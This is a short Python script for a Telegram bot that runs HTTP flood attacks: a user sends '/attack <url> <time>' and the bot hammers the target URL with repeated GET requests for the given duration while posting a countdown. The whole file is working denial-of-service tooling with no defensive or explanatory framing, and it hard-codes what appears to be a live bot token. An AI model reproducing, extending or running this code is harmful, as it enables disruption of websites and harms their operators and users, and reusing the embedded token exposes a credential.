import telebot
import requests
import threading
import time
import os

TOKEN = ('8415253056:AAFCqKO7Ru6nYpkKT7mlJjOPAW5aIBj9W1E')

bot = telebot.TeleBot(TOKEN)

def attack_logic(target_url, duration, msg, chat_id):
    timeout = time.time() + int(duration)
    # Background thread for requests
    def flood():
        while time.time() < timeout:
            try:
                requests.get(target_url, timeout=1)
            except:
                pass
    
    threading.Thread(target=flood).start()

    # Countdown logic for Telegram
    remaining = int(duration)
    while remaining > 0:
        try:
            bot.edit_message_text(f"🚀 **Attack Started!**\n🎯 Target: {target_url}\n⏳ Time Left: {remaining}s", chat_id, msg.message_id)
            time.sleep(5) # Telegram limit se bachne ke liye 5s gap
            remaining -= 5
        except:
            break
    bot.edit_message_text("✅ **Attack Finished!**", chat_id, msg.message_id)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        # Format: /attack http://target.com 60
        args = message.text.split()
        target = args[1]
        time_period = args[2]
        sent_msg = bot.reply_to(message, "⚡ Initializing Cloud Attack...")
        attack_logic(target, time_period, sent_msg, message.chat.id)
    except:
        bot.reply_to(message, "❌ Format: /attack <url> <time>")

bot.polling()
